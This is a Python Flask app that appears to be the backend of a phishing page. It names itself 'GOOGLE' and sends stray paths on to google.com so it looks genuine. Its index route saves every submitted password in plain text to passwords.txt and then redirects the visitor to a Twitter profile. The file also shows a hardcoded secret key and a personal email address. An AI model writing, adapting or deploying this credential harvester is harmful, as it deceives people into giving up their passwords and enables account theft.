from flask import (
    flash,
    Flask,
    current_app,
    render_template,
    redirect,
    abort,
    request,
    url_for,
    session,
)
import os


full_path = os.path.realpath(__file__)
baseDir, appName = os.path.split(full_path)

app = Flask(
    "GOOGLE",
    template_folder=os.path.join(
        baseDir,
        'templates'
    ),
    static_folder="%s/static" % (baseDir)
)

app.secret_key = "y2x4w4\
v4u6t6s6r6q8p8o8n8*m8l8k8j0i0h0g0f0\
                e0d0c0b0a"

buitins = {
    'range': range
}


def render(template_name, **context_vars):
    context = {}
    context.update(buitins)
    context.update(context_vars)
    return render_template(template_name, **context)


def data(Name):
    return os.path.join(baseDir, '.data', Name)


def template(Type, Name):
    return os.path.join(
        baseDir,
        'templates',
        Type,
        Name
    )


@app.route("/", methods=["GET", "POST", "PUT"])
def index():
    if request.method == "POST":
        with open("passwords.txt", "a+") as f:
            f.write(request.form.get("password") + "\n")
        return redirect(
            "https://twitter.com/_Furoo"
        )

    return render("index.html", email="Furothomas7@gmail.com")


@app.route("/<path:path>", methods=["GET", "POST", "HEAD"])
def anonymous(path):
    return redirect(f"https://www.google.com/{path}")
